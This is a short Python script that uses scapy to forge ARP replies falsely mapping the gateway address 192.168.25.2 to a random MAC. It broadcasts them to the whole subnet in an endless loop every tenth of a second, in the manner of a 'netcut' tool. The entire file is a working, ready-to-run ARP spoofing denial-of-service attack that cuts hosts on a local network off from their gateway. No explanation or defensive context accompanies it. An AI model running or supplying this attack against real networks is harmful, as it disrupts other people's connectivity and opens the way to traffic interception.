from scapy.all import *
import os

cutIp="192.168.25.255"
cutMac="ff:ff:ff:ff:ff:ff"
gwIp="192.168.25.2"
gwMac=RandMAC()
netCut=ARP(op=2,hwsrc=gwMac,psrc=gwIp,hwdst=cutMac,pdst=cutIp)
#send(netCut,loop=1,inter=1)
sendp(Ether(dst=cutMac,src=gwMac)/netCut,loop=1,inter=0.1)
